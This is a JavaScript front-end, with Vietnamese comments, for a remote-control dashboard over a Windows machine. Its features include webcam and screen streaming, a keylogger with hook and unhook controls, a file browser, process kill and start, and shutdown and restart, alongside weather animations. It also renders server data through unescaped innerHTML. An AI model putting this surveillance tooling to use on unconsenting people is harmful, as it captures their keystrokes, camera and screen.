let isWebcamRecording = false;

// --- 1. HIỆU ỨNG THIÊN NHIÊN (Giữ nguyên) ---
const cloudContainer = document.getElementById('cloudContainer');
const clouds = [];

function createClouds() {
    const container = document.getElementById('cloudContainer');
    if (!container) return;
    container.innerHTML = ''; 
    for (let i = 0; i < 6; i++) {
        const cloud = document.createElement('div');
        cloud.classList.add('cloud');
        // Random vị trí và kích thước
        cloud.style.top = Math.random() * 30 + 5 + '%'; // Nằm ở 30% trên cùng
        cloud.style.left = Math.random() * 80 + '%'; // Rải rác
        cloud.style.transform = `scale(${Math.random() * 0.6 + 0.7})`;
        // Mây bay chậm
        cloud.style.animationDuration = Math.random() * 40 + 40 + 's';
        cloud.style.animationDelay = Math.random() * -50 + 's'; 
        container.appendChild(cloud);
    }
}

function createStars() {
    const container = document.getElementById('starContainer'); 
    if (!container) return;
    container.innerHTML = '';
    for (let i = 0; i < 60; i++) {
        const star = document.createElement('div'); 
        star.classList.add('star');
        const size = Math.random() * 2 + 1 + 'px'; 
        star.style.width = size; star.style.height = size;
        star.style.top = Math.random() * 100 + '%'; 
        star.style.left = Math.random() * 100 + '%';
        // Sao lấp lánh
        star.style.animationDuration = Math.random() * 3 + 2 + 's'; 
        star.style.animationDelay = Math.random() * 5 + 's';
        container.appendChild(star);
    }
}

// Gọi khởi tạo ngay
document.addEventListener("DOMContentLoaded", () => {
    createClouds();
    createStars();
});

// Hàm đổi giao diện Sáng/Tối
function toggleTheme() {
    const body = document.body;
    const btn = document.querySelector('.theme-toggle');
    let isDarkNow = false;

    if (body.classList.contains('light-mode')) {
        body.classList.remove('light-mode'); body.classList.add('dark-mode');
        if(btn) btn.innerText = "☀️ Chế độ Ngày";
        isDarkNow = true;
    } else {
        body.classList.remove('dark-mode'); body.classList.add('light-mode');
        if(btn) btn.innerText = "🌙 Chế độ Đêm";
        isDarkNow = false;
    }

// Nếu chuyển sang tối mà có tuyết -> Kích hoạt gió thổi
    if (isDarkNow && snowLevel > 0) {
        showNightScene();
    }
}

// --- 2. LOGIC LOGIN (WEBSOCKET) ---
let socket = null;
const ipInput = document.getElementById('ipInput');
const portInput = document.getElementById('portInput');
// Tự điền IP nếu có thể
ipInput.value = window.location.hostname; 
portInput.value = "8888";


// Biến toàn cục để lưu thời gian bắt đầu bấm nút
let connectStartTime = 0;

function handleConnection() {
    const targetIP = ipInput.value.trim();
    const targetPort = portInput.value.trim();

    if (!targetIP || !targetPort) { alert("Thiếu IP/Port!"); return; }
    if (socket) { try { socket.close(); } catch(e){} }

    // GHI NHỚ THỜI GIAN BẮT ĐẦU
    connectStartTime = Date.now();

    // 1. Ẩn form Login
    document.getElementById('loginSection').style.display = 'none';
    
    // 2. Hiện màn hình Chờ (Transition)
    const trans = document.getElementById('transitionScreen');
    
    // Reset nội dung
    document.getElementById('transIcon').innerText = "🌱";
    document.getElementById('transIcon').classList.add('bouncing');
    document.getElementById('transTitle').innerText = "Đang kết nối...";
    document.getElementById('transTitle').style.color = "#86efac";
    document.getElementById('transDesc').innerText = `Đang gọi đến ${targetIP}:${targetPort}...`;
    
    // Bắt buộc hiện bằng JS
    trans.style.display = 'flex';
    trans.style.opacity = '1';

    try {
        socket = new WebSocket(`ws://${targetIP}:${targetPort}`);
        socket.onopen = function() { socket.send("CONNECT"); };
        
        socket.onmessage = function(event) {
            if (event.data.includes("Bridge OK") || event.data.includes("connected") || event.data.includes("OK")) {
                showSuccess(targetIP, targetPort);
            } else if (event.data.includes("error")) {
                showError("Lỗi: Server C++ chưa bật!");
            }
        };
        socket.onerror = function() { showError("Lỗi kết nối Socket!"); };
        
        // Timeout 10s
        setTimeout(() => {
            if (trans.style.display !== 'none' && 
                document.getElementById('transTitle').innerText.includes('Đang')) {
                showError("Timeout: Server không phản hồi.");
            }
        }, 10000);

    } catch (err) { showError(err.message); }
}

function showError(msg) {
    const icon = document.getElementById('transIcon');
    const title = document.getElementById('transTitle');
    const desc = document.getElementById('transDesc');

    icon.classList.remove('bouncing');
    icon.innerText = "🥀";
    title.innerText = "Kết nối Thất bại";
    title.style.color = "#ef4444";
    desc.innerText = msg;

    setTimeout(() => {
        document.getElementById('transitionScreen').style.display = 'none';
        document.getElementById('loginSection').style.display = 'block';
    }, 2500);
}

// Hàm nút Hủy
function cancelLoading() {
    if(socket) socket.close();
    showError("Đã hủy kết nối.");
}

function showSuccess(ip, port) {
    // Tính toán thời gian đã chờ
    const MIN_WAIT = 4000; // Ít nhất 4 giây để đọc Info
    const elapsed = Date.now() - connectStartTime;
    let remain = MIN_WAIT - elapsed;
    if (remain < 0) remain = 0;

    console.log(`Kết nối OK. Chờ thêm ${remain}ms...`);

    setTimeout(() => {
        // Bước A: Báo thành công trên màn hình chờ
        const icon = document.getElementById('transIcon');
        const title = document.getElementById('transTitle');
        const desc = document.getElementById('transDesc');

        icon.classList.remove('bouncing');
        icon.innerText = "🌳"; // Cây lớn
        title.innerText = "Kết nối Thành công!";
        title.style.color = "#4ade80";
        desc.innerText = "Đang vào hệ thống...";

        // Bước B: Chuyển cảnh sang Dashboard (Sau 1s nữa)
        setTimeout(() => {
            // 1. Ẩn màn hình chờ hoàn toàn
            const trans = document.getElementById('transitionScreen');
            trans.style.opacity = '0'; // Mờ dần
            
            setTimeout(() => {
                trans.style.display = 'none'; // Ẩn cứng sau khi mờ
                
                // 2. Hiện Dashboard
                const app = document.getElementById('appSection');
                app.style.display = 'flex'; // QUAN TRỌNG: Phải set flex
                
                // Kích hoạt animation hiện ra
                setTimeout(() => app.classList.add('active'), 50);
                
            }, 500); // Chờ hiệu ứng mờ kết thúc

        }, 1000); 

    }, remain);
}


function logout() {
    if(socket) socket.close();
    
    // Ẩn Dashboard
    const app = document.getElementById('appSection');
    app.classList.remove('active');
    app.style.display = 'none';

    // Hiện màn hình chờ (Tạm biệt)
    const trans = document.getElementById('transitionScreen');
    document.getElementById('transIcon').innerText = "👋";
    document.getElementById('transIcon').classList.add('bouncing');
    document.getElementById('transTitle').innerText = "Đang đăng xuất...";
    document.getElementById('transTitle').style.color = "#fbbf24";
    document.getElementById('transDesc').innerText = "Hẹn gặp lại!";
    
    trans.style.display = 'flex';
    trans.style.opacity = '1';

    // Chờ 3 giây rồi về Login
    setTimeout(() => {
        trans.style.display = 'none';
        document.getElementById('loginSection').style.display = 'block';
        
        // Reset nút
        document.getElementById('mainBtn').innerHTML = "Kết nối ngay";
        document.getElementById('mainBtn').classList.remove('error');
    }, 3000);
}

// --- 3. LOGIC DASHBOARD (WEBCAM + APPS) ---

function logMsg(msg) {
    const el = document.getElementById('mini-log');
    if(el) el.innerText = "> " + msg;
}

function toggleWebcam(action) {
    const img = document.getElementById('video-feed');
    const dot = document.getElementById('recDot');
    
    if (action === 'start') {
        fetch('/api/webcam/start', {method: 'POST'}).catch(e=>console.log(e));
        img.src = "/video_feed"; 
        img.style.opacity = "1";
        dot.style.display = "block";
        logMsg("Đang kết nối Camera...");
    } else {
        fetch('/api/webcam/stop', {method: 'POST'}).catch(e=>console.log(e));
        img.src = "";
        img.style.opacity = "0.2";
        dot.style.display = "none";
        logMsg("Đã tắt Camera.");
    }
}

function loadApps() {
    const tbody = document.getElementById('app-list-body');
    tbody.innerHTML = "<tr><td colspan='3' style='text-align:center'>Đang tìm kiếm...</td></tr>";
    
    fetch('/api/list_apps')
    .then(res => res.json())
    .then(data => {
        tbody.innerHTML = "";
        if(data.length === 0) {
                tbody.innerHTML = "<tr><td colspan='3' style='text-align:center'>Trống.</td></tr>";
                return;
        }
        data.forEach(app => {
            tbody.innerHTML += `
                <tr>
                    <td>${app.id}</td>
                    <td>${app.name}</td>
                    <td style="text-align: right;">
                        <button class="btn-nature danger" style="padding: 2px 8px; font-size: 0.7rem;" onclick="killProc('${app.id}')">KILL</button>
                    </td>
                </tr>
            `;
        });
        logMsg(`Tìm thấy ${data.length} tiến trình.`);
    })
    .catch(err => {
        tbody.innerHTML = "<tr><td colspan='3' style='text-align:center; color:#fca5a5'>Lỗi API!</td></tr>";
        logMsg("Lỗi kết nối Server API.");
    });
}

function killProc(pid) {
    if(!confirm(`Dừng PID ${pid}?`)) return;
    fetch('/api/kill', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({pid: pid})
    }).then(res => res.json()).then(data => {
        logMsg(`Đã dừng PID: ${pid}`);
        loadApps();
    });
}

// Đồng hồ
setInterval(() => {
    const c = document.getElementById('clock');
    if(c) c.innerText = new Date().toLocaleTimeString();
}, 1000);

// 1. Hàm quay về màn hình Dashboard chính
function goHome() {
    const appSection = document.getElementById('appSection');
    
    // Gỡ bỏ class active -> Menu sẽ tự phóng to lại
    appSection.classList.remove('feature-active');
    
    // Dừng các tính năng đang chạy (Webcam/Screen) để tiết kiệm
    fetch('/api/webcam/stop', {method: 'POST'}).catch(()=>{});
    
    // Xóa nội dung cũ
    document.getElementById('dynamicContent').innerHTML = '';
}


// 2. Cập nhật hàm switchMode
function switchMode(mode) {
    const appSection = document.getElementById('appSection');
    const container = document.getElementById('dynamicContent');
    
    // Kích hoạt giao diện chi tiết (Menu thu nhỏ)
    appSection.classList.add('feature-active');
    
    // Hiện thông báo đang tải
    container.innerHTML = '<div style="text-align:center; margin-top:50px; font-size:1.2rem;">⏳ Đang kết nối...</div>';
    
    // Gọi API chuyển mode
    fetch('/api/set_mode', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ mode: mode })
    })
    .then(res => res.json())
    .then(data => {
        if(data.status === 'ok') {
            renderContent(mode);
        } else {
            container.innerHTML = '<p style="color:#fca5a5; text-align:center;">Lỗi server.</p>';
        }
    })
    .catch(err => {
        console.error(err);
        container.innerHTML = '<p style="color:#fca5a5; text-align:center;">Mất kết nối!</p>';
    });
}

function renderContent(mode) {
    const container = document.getElementById('dynamicContent');
    
    if (mode === 'webcam') {
        isWebcamRecording = false; 
        
        container.innerHTML = `
            <div id="webcamFrame" class="cam-frame" style="height:100%; flex:1; position: relative; overflow: hidden; border-radius: 12px;">
                <div class="rec-indicator">
                    <div class="rec-dot"></div> REC
                </div>

                <div class="top-right-controls">
                    <button id="btnRecordWebcam" class="icon-btn record-btn" onclick="toggleWebcamRecord()" title="Ghi hình">
                        <span>⏺️</span> 
                    </button>

                    <button class="icon-btn" onclick="downloadSnapshot('webcam')" title="Chụp ảnh nhanh">
                        📸
                    </button>
                </div>

                <img src="/video_feed" style="width:100%; height:100%; object-fit:cover;">
            </div>
            `;
    }
    else if (mode === 'screen') {
        container.innerHTML = `
            <div class="cam-frame" style="height:100%; flex:1;">
                <img src="/screen_feed" style="width:100%; height:100%; object-fit:contain; border-radius:6px;">
            </div>
            <div style="text-align:center; color:#93c5fd; margin-top:10px;">🖥️ Đang stream màn hình</div>
        `;
    }
    else if (mode === 'keylogger') {
        container.innerHTML = `
            <div class="dash-card" style="display:flex; flex-direction:column; height:100%;">
                <div style="margin-bottom:10px; display:flex; gap:8px; flex-wrap:wrap;">
                    <button class="btn-nature" onclick="keylogHook()">Bắt đầu Ghi (Hook)</button>
                    <button class="btn-nature" onclick="keylogUnhook()">Dừng Ghi (Unhook)</button>
                    <button class="btn-nature" onclick="keylogLoad()">Tải Keylog</button>
                </div>
                <textarea id="keylogBox" style="flex:1; width:100%; resize:none; background:rgba(15,23,42,0.9); color:#e5e7eb; border-radius:8px; padding:10px; border:1px solid rgba(148,163,184,0.4); font-family:Consolas,monospace;"></textarea>
            </div>
        `;
    }
    else if (mode === 'notify') {
        container.innerHTML = `
            <div class="dash-card" style="display:flex; flex-direction:column; height:100%;">
                <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;">
                    <h3 style="margin:0; color:#a5b4fc;">🔔 Lịch sử Thông báo</h3>
                    <button class="btn-nature" onclick="loadNotify()">Tải lại</button>
                </div>
                <div style="flex:1; overflow-y:auto;">
                    <table class="nature-table">
                        <thead>
                            <tr><th>App</th><th>Thời gian</th><th>Nội dung</th></tr>
                        </thead>
                        <tbody id="notifyBody">
                            <tr><td colspan="3">Đang tải...</td></tr>
                        </tbody>
                    </table>
                </div>
            </div>
        `;
        loadNotify();
    }
    else if (mode === 'files') {
        container.innerHTML = `
            <div class="dash-card" style="display:flex; flex-direction:column; height:100%;">
                <div style="display:flex; gap:8px; margin-bottom:10px; align-items:center;">
                    <button class="btn-nature" onclick="loadDrives()">🏠 Drives</button>
                    <button class="btn-nature" onclick="goBackPath()">⬅ Back</button>
                    <input id="currentPath" class="custom-input" style="background:rgba(15,23,42,0.7); color:#e5e7eb; border-radius:10px; border:1px solid rgba(148,163,184,0.4);" readonly value="My Computer">
                </div>
                <div style="flex:1; overflow-y:auto;">
                    <table class="nature-table">
                        <thead>
                            <tr><th>Tên</th><th>Loại</th><th>Kích thước</th></tr>
                        </thead>
                        <tbody id="fileBody">
                            <tr><td colspan="3">Đang tải...</td></tr>
                        </tbody>
                    </table>
                </div>
            </div>
        `;
        window._currentPath = "";  // global state
        loadDrives();
    }
    else if (mode === 'apps') { // Đang chạy + KILL
        container.innerHTML = `
            <div class="dash-card" style="display:flex; flex-direction:column; height:100%;">
                <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;">
                    <h3 style="margin:0; color:#86efac;">🔥 Ứng dụng đang chạy</h3>
                    <button class="btn-nature" onclick="loadRunningApps()">Làm mới</button>
                </div>
                <div style="flex:1; overflow-y:auto;">
                    <table class="nature-table">
                        <thead>
                            <tr><th>ID</th><th>Tên</th><th>Threads</th><th></th></tr>
                        </thead>
                        <tbody id="appListBody">
                            <tr><td colspan="4">Đang tải...</td></tr>
                        </tbody>
                    </table>
                </div>
            </div>
        `;
        loadRunningApps();
    }
    else if (mode === 'process') {  // Ứng dụng đã cài + START
        container.innerHTML = `
            <div class="dash-card" style="display:flex; flex-direction:column; height:100%;">
                <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;">
                    <h3 style="margin:0; color:#fde68a;">🚀 Ứng dụng đã cài</h3>
                    <button class="btn-nature" onclick="loadInstalledApps()">Lấy DS Ứng dụng</button>
                </div>
                <div style="flex:1; overflow-y:auto;">
                    <table class="nature-table">
                        <thead>
                            <tr><th>Tên ứng dụng</th><th style="width:120px;"></th></tr>
                        </thead>
                        <tbody id="installedBody">
                            <tr><td colspan="2">Chưa tải.</td></tr>
                        </tbody>
                    </table>
                </div>
            </div>
        `;
    }

    else if (mode === 'custom') {
        container.innerHTML = `
            <div class="dash-card" style="display:flex; flex-direction:column; height:100%; justify-content:center; align-items:center;">
                <h2 style="color:#a7f3d0; margin-bottom: 30px;">⚙️ Quản trị Hệ thống</h2>
                
                <div style="display:grid; grid-template-columns: repeat(3, 1fr); gap: 20px; width: 100%; max-width: 600px;">
                    
                    <div class="power-card" onclick="if(confirm('Bạn có chắc muốn khởi động lại Server?')) restartServer()">
                        <div class="p-icon">🔄</div>
                        <div class="p-title">Khởi động lại</div>
                        <div class="p-desc">Reboot máy chủ Windows</div>
                    </div>

                    <div class="power-card danger" onclick="if(confirm('CẢNH BÁO: Tắt máy sẽ mất kết nối vĩnh viễn! Tiếp tục?')) shutdownServer()">
                        <div class="p-icon">🛑</div>
                        <div class="p-title">Tắt nguồn</div>
                        <div class="p-desc">Shutdown máy chủ ngay lập tức</div>
                    </div>

                    <div class="power-card logout" onclick="logout()">
                        <div class="p-icon">🚪</div>
                        <div class="p-title">Đăng xuất</div>
                        <div class="p-desc">Ngắt kết nối khỏi phiên này</div>
                    </div>

                </div>
            </div>
        `;
    }

    else {
        container.innerHTML = `
            <div style="text-align:center; margin-top:50px;">
                <h3>Chế độ: ${mode.toUpperCase()}</h3>
                <p>Đã gửi lệnh kích hoạt. Server đang xử lý...</p>
            </div>`;
    }
}


// ==== KEYLOGGER ====
function keylogHook() {
    fetch('/api/keylog/hook', {method:'POST'})
        .then(r=>r.json()).then(res => {
            logMsg(res.ok ? "Đã bật Hook Keylogger." : "Lỗi bật Hook.");
        }).catch(()=>logMsg("Lỗi API Keylog."));
}
function keylogUnhook() {
    fetch('/api/keylog/unhook', {method:'POST'})
        .then(r=>r.json()).then(res => {
            logMsg(res.ok ? "Đã tắt Hook Keylogger." : "Lỗi tắt Hook.");
        }).catch(()=>logMsg("Lỗi API Keylog."));
}
function keylogLoad() {
    fetch('/api/keylog/text')
        .then(r=>r.json())
        .then(data => {
            const box = document.getElementById('keylogBox');
            if (box) box.value = data.text || "";
            logMsg("Đã tải keylog.");
        })
        .catch(()=>logMsg("Lỗi tải keylog."));
}

// ==== NOTIFICATIONS ====
function loadNotify() {
    const tbody = document.getElementById('notifyBody');
    if (!tbody) return;
    tbody.innerHTML = `<tr><td colspan="3">Đang tải...</td></tr>`;
    fetch('/api/notify/list')
        .then(r=>r.json())
        .then(list => {
            tbody.innerHTML = "";
            if (!list || list.length === 0) {
                tbody.innerHTML = `<tr><td colspan="3">Không có dữ liệu.</td></tr>`;
                return;
            }
            list.forEach(n => {
                tbody.innerHTML += `
                    <tr>
                        <td>${n.app}</td>
                        <td>${n.time}</td>
                        <td>${n.content}</td>
                    </tr>
                `;
            });
            logMsg(`Đã tải ${list.length} thông báo.`);
        })
        .catch(()=> {
            tbody.innerHTML = `<tr><td colspan="3" style="color:#fca5a5;">Lỗi API.</td></tr>`;
            logMsg("Lỗi tải thông báo.");
        });
}

// ==== FILE MANAGER ====
function loadDrives() {
    const tbody = document.getElementById('fileBody');
    const pathInput = document.getElementById('currentPath');
    if (!tbody || !pathInput) return;

    pathInput.value = "My Computer";
    window._currentPath = "";
    tbody.innerHTML = `<tr><td colspan="3">Đang tải...</td></tr>`;

    fetch('/api/files/drives')
        .then(r=>r.json())
        .then(list => {
            tbody.innerHTML = "";
            if (!list || list.length === 0) {
                tbody.innerHTML = `<tr><td colspan="3">Không có dữ liệu.</td></tr>`;
                return;
            }
            list.forEach(e => {
                const icon = e.type === "DRIVE" ? "💽 " : e.type === "FOLDER" ? "📁 " : "📄 ";
                tbody.innerHTML += `
                    <tr onclick="fileRowClick('${e.name.replace(/\\/g,'\\\\')}', '${e.type}')">
                        <td>${icon}${e.name}</td>
                        <td>${e.type}</td>
                        <td>${e.size}</td>
                    </tr>
                `;
            });
        })
        .catch(()=> {
            tbody.innerHTML = `<tr><td colspan="3" style="color:#fca5a5;">Lỗi API.</td></tr>`;
        });
}

function fileRowClick(name, type) {
    if (type === "DRIVE") {
        openPath(name);
    } else if (type === "FOLDER") {
        let base = window._currentPath || "";
        let newPath = base ? (base + name + "\\") : name;
        openPath(newPath);
    } else {
        logMsg(`File: ${name} (chưa hỗ trợ tải về Web)`);
    }
}

function openPath(path) {
    const tbody = document.getElementById('fileBody');
    const pathInput = document.getElementById('currentPath');
    if (!tbody || !pathInput) return;

    tbody.innerHTML = `<tr><td colspan="3">Đang tải...</td></tr>`;

    fetch('/api/files/list', {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify({path: path})
    })
    .then(r=>r.json())
    .then(list => {
        window._currentPath = path;
        pathInput.value = path;
        tbody.innerHTML = "";
        if (!list || list.length === 0) {
            tbody.innerHTML = `<tr><td colspan="3">Thư mục trống.</td></tr>`;
            return;
        }
        list.forEach(e => {
            const icon = e.type === "DRIVE" ? "💽 " : e.type === "FOLDER" ? "📁 " : "📄 ";
            tbody.innerHTML += `
                <tr onclick="fileRowClick('${e.name.replace(/\\/g,'\\\\')}', '${e.type}')">
                    <td>${icon}${e.name}</td>
                    <td>${e.type}</td>
                    <td>${e.size}</td>
                </tr>
            `;
        });
    })
    .catch(()=> {
        tbody.innerHTML = `<tr><td colspan="3" style="color:#fca5a5;">Lỗi API.</td></tr>`;
    });
}

function goBackPath() {
    let cur = window._currentPath || "";
    if (!cur || cur.length <= 3) {
        loadDrives();
        return;
    }
    let parent = cur.replace(/\\+$/,'');
    const lastSlash = parent.lastIndexOf('\\');
    if (lastSlash > 2) {
        parent = parent.substring(0, lastSlash+1);
    } else {
        parent = parent.substring(0, 3);
    }
    openPath(parent);
}

// ==== RUNNING APPS (Apps block) ====
function loadRunningApps() {
    const tbody = document.getElementById('appListBody');
    if (!tbody) return;
    tbody.innerHTML = `<tr><td colspan="4">Đang tải...</td></tr>`;
    fetch('/api/list_apps')
        .then(r=>r.json())
        .then(list => {
            tbody.innerHTML = "";
            if (!list || list.length === 0) {
                tbody.innerHTML = `<tr><td colspan="4">Trống.</td></tr>`;
                return;
            }
            list.forEach(p => {
                tbody.innerHTML += `
                    <tr>
                        <td>${p.id}</td>
                        <td>${p.name}</td>
                        <td>${p.threads}</td>
                        <td style="text-align:right;">
                            <button class="btn-nature danger" onclick="killProc('${p.id}')">KILL</button>
                        </td>
                    </tr>
                `;
            });
        })
        .catch(()=> {
            tbody.innerHTML = `<tr><td colspan="4" style="color:#fca5a5;">Lỗi API.</td></tr>`;
        });
}

// ==== INSTALLED APPS (Processes block) ====
function loadInstalledApps() {
    const tbody = document.getElementById('installedBody');
    if (!tbody) return;
    tbody.innerHTML = `<tr><td colspan="2">Đang tải...</td></tr>`;
    fetch('/api/apps/installed')
        .then(r=>r.json())
        .then(list => {
            tbody.innerHTML = "";
            if (!list || list.length === 0) {
                tbody.innerHTML = `<tr><td colspan="2">Không có dữ liệu.</td></tr>`;
                return;
            }
            list.forEach(a => {
                const name = a.name;
                tbody.innerHTML += `
                    <tr>
                        <td>${name}</td>
                        <td style="text-align:right;">
                            <button class="btn-nature" onclick="startInstalledApp('${name.replace(/'/g,"\\'")}')">START</button>
                        </td>
                    </tr>
                `;
            });
        })
        .catch(()=> {
            tbody.innerHTML = `<tr><td colspan="2" style="color:#fca5a5;">Lỗi API.</td></tr>`;
        });
}

function startInstalledApp(name) {
    fetch('/api/process/start', {
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body: JSON.stringify({name: name})
    })
    .then(r=>r.json())
    .then(res => {
        logMsg(res.ok ? `Đã gửi lệnh mở: ${name}` : `Lỗi mở: ${name}`);
    })
    .catch(()=>logMsg("Lỗi API StartProcess."));
}

function shutdownServer() {
    fetch('/api/power', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({action: 'shutdown'})
    })
    .then(res => res.json())
    .then(data => {
        if (data.ok) {
            alert('Máy chủ đang tắt...');
        } else {
            alert('Không thể tắt máy.');
        }
    })
    .catch(err => {
        console.error(err);
        alert('Lỗi kết nối khi shutdown.');
    });
}

function restartServer() {
    fetch('/api/power', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({action: 'restart'})
    })
    .then(res => res.json())
    .then(data => {
        if (data.ok) {
            alert('Máy chủ đang khởi động lại...');
        } else {
            alert('Không thể restart máy.');
        }
    })
    .catch(err => {
        console.error(err);
        alert('Lỗi kết nối khi restart.');
    });
}

// ============================================================
// 4. WEATHER MANAGER (QUẢN LÝ THỜI TIẾT TẬP TRUNG)
// ============================================================

const WEATHER = { CLEAR: 'clear', RAIN: 'rain', SNOW: 'snow' };
let currentWeather = WEATHER.CLEAR;

// Các biến Timer quản lý
let snowLevel = 0;           // Độ dày tuyết (0-100)
let snowAccumulateTimer = null; // Timer tuyết rơi phủ dày
let meltingTimer = null;        // Timer tuyết tan (do nắng hoặc mưa)
let lightningTimer = null;      // Timer sấm sét
let nightTimer = null;          // Timer cục tuyết lăn
let giftTimer = null;

// --- CẤU HÌNH THỜI GIAN THỰC (NORMAL MODE) ---
const CFG = {
    rainDuration: 45000,     // Mưa 45 giây
    snowDuration: 60000,     // Tuyết rơi 60 giây
    breakTime: 60000,        // Nghỉ 1 phút
    snowSpeed: 500,          // Tốc độ phủ tuyết (500ms tăng 1%)
    lightningRate: 4000      // Tần suất sấm sét trung bình
};

// --- HÀM VISUAL (HIỂN THỊ) ---
function createRain() { /* ...giữ nguyên code cũ... */
    const container = document.getElementById('rainContainer');
    if(!container) return;
    container.innerHTML = '';
    for (let i = 0; i < 150; i++) {
        const drop = document.createElement('div');
        drop.classList.add('raindrop');
        drop.style.left = Math.random() * 100 + '%';
        drop.style.animationDuration = Math.random() * 0.2 + 0.3 + 's';
        drop.style.animationDelay = Math.random() * 2 + 's';
        container.appendChild(drop);
    }
}

function createSnow() { /* ...giữ nguyên code cũ... */
    const container = document.getElementById('snowContainer');
    if(!container) return;
    container.innerHTML = '';
    container.style.display = 'block'; 
    for(let i=0; i<60; i++) {
        const flake = document.createElement('div');
        flake.classList.add('snowflake');
        flake.style.left = Math.random() * 100 + '%';
        const size = Math.random() * 5 + 4 + 'px'; 
        flake.style.width = size; flake.style.height = size;
        flake.style.animationDuration = Math.random() * 3 + 2 + 's';
        flake.style.animationDelay = Math.random() * 2 + 's';
        flake.style.opacity = Math.random() * 0.5 + 0.5; 
        container.appendChild(flake);
    }
}

// --- LOGIC SẤM CHỚP ---
function triggerLightning() {
    // 1. Chớp màn hình
    const flash = document.getElementById('flash');
    if(flash) {
        flash.classList.remove('active');
        void flash.offsetWidth; 
        flash.classList.add('active');
    }
    // 2. Tia sét đánh xuống đất (Mới)
    const container = document.getElementById('lightningContainer');
    if (container) {
        const bolt = document.createElement('div');
        bolt.classList.add('lightning-bolt');
        bolt.style.left = Math.random() * 80 + 10 + '%'; 
        container.appendChild(bolt);
        setTimeout(() => bolt.remove(), 400); 
    }
    // 3. Loop
    if(currentWeather === WEATHER.RAIN) {
        const next = Math.random() * CFG.lightningRate + 1000;
        lightningTimer = setTimeout(triggerLightning, next);
    }
}

// --- CẬP NHẬT GIAO DIỆN TUYẾT ---
function updateSnowVisuals() {
    if (snowLevel < 0) snowLevel = 0;
    if (snowLevel > 100) snowLevel = 100;

    const opacity = snowLevel / 100;
    const ground = document.getElementById('groundSnow');
    const tree = document.getElementById('treeSnow');
    
    if(ground) ground.style.opacity = opacity;
    if(tree) tree.style.opacity = opacity;

    // Kích hoạt lăn tuyết (Logic cũ)
    if (snowLevel > 30 && !nightTimer) {
        startSnowballEffect();
    }

    // [MỚI] Kích hoạt quà rơi
    // Chỉ cần Tuyết dày > 30% và Không Mưa là rơi (Sáng/Tối/Tuyết rơi đều được)
    if (snowLevel > 30 && currentWeather !== WEATHER.RAIN && !giftTimer) {
        console.log("🎁 Tuyết đẹp -> Bắt đầu rải quà!");
        startMagicGiftEffect();
    }
}


// --- LOGIC RỬA/TAN TUYẾT (QUAN TRỌNG) ---
function startMelting(isRain) {
    if (meltingTimer) clearInterval(meltingTimer);

    console.log(isRain ? "⛈️ Mưa to -> Rửa trôi tuyết!" : "☀️ Nắng lên -> Tuyết tan dần...");

    meltingTimer = setInterval(() => {
        // Nếu hết tuyết thì dừng
        if (snowLevel <= 0) {
            clearInterval(meltingTimer);
            meltingTimer = null;
            return;
        }

        // Tốc độ tan: Mưa tan nhanh gấp 10 lần Nắng
        const meltRate = isRain ? 5.0 : 0.5; 
        snowLevel -= meltRate;
        updateSnowVisuals();

    }, 200); // Cập nhật mỗi 200ms
}

// --- LOGIC RƠI QUÀ (MAGIC DROP) ---
function startMagicGiftEffect() {
    // Nếu đang chạy loop rồi thì thôi, tránh chồng chéo
    if (giftTimer) return;

    function spawnSingleGift() {
        // ĐIỀU KIỆN DỪNG:
        // 1. Tuyết tan hết (< 30%)
        // 2. Hoặc Trời đang Mưa (Mưa làm ướt quà nên dừng)
        // Lưu ý: Trời tối hay sáng đều rơi được, miễn là có tuyết nền.
        if (snowLevel < 30 || currentWeather === WEATHER.RAIN) {
            giftTimer = null;
            return; 
        }

        const container = document.getElementById('giftContainer');
        if (!container) return;

        // --- 1. TẠO 1 GÓI QUÀ DUY NHẤT ---
        const giftIcons = ['🎁', '🎀', '🧸', '🔔', '🍬', '🎄'];
        const gift = document.createElement('div');
        gift.classList.add('falling-item');
        gift.innerText = giftIcons[Math.floor(Math.random() * giftIcons.length)];
        
        // Random vị trí rơi (tránh rơi vào giữa cây thông bên trái quá nhiều)
        // Cho rơi từ 20% đến 90% chiều ngang
        gift.style.left = Math.random() * 70 + 20 + '%'; 
        
        // Random tốc độ rơi (Rơi nhanh/chậm khác nhau)
        gift.style.animationDuration = Math.random() * 2 + 4 + 's'; // 4s - 6s
        
        // Random kích thước
        gift.style.fontSize = Math.random() * 1 + 1.5 + 'rem'; 
        
        container.appendChild(gift);
        setTimeout(() => gift.remove(), 6000); // Xóa sau khi animation xong

        // --- 2. TẠO KÈM 1 BÔNG TUYẾT LỤC GIÁC (OPTIONAL) ---
        // (Để tạo cảm giác lung linh)
        const snowChars = ['❄', '❅', '❆'];
        const snow = document.createElement('div');
        snow.classList.add('falling-magic-snow');
        snow.innerText = snowChars[Math.floor(Math.random() * snowChars.length)];
        snow.style.left = gift.style.left; // Rơi gần gói quà
        snow.style.fontSize = Math.random() * 10 + 15 + 'px';
        snow.style.animationDuration = Math.random() * 2 + 5 + 's';
        container.appendChild(snow);
        setTimeout(() => snow.remove(), 7000);

        // --- 3. HẸN GIỜ GÓI TIẾP THEO (RẤT NGẪU NHIÊN) ---
        // Lúc thì 2 giây rơi tiếp, lúc thì 10 giây mới rơi -> Tự nhiên
        const nextTime = Math.random() * 8000 + 2000; 
        giftTimer = setTimeout(spawnSingleGift, nextTime);
    }

    // Bắt đầu gói đầu tiên
    spawnSingleGift();
}

// --- BẮT ĐẦU MƯA ---
function startRain() {
    // Nếu đang mưa rồi thì thôi
    if (currentWeather === WEATHER.RAIN) return;
    if (giftTimer) { clearTimeout(giftTimer); giftTimer = null; }

    console.log("⛈️ BẮT ĐẦU MƯA!");
    currentWeather = WEATHER.RAIN;
    
    // 1. Dừng ngay tuyết rơi (nếu có)
    document.getElementById('snowContainer').style.display = 'none';
    if (snowAccumulateTimer) clearInterval(snowAccumulateTimer);

    // 2. Kích hoạt hiệu ứng Mưa
    document.body.classList.add('storm-active');
    document.body.classList.remove('is-dimmed');
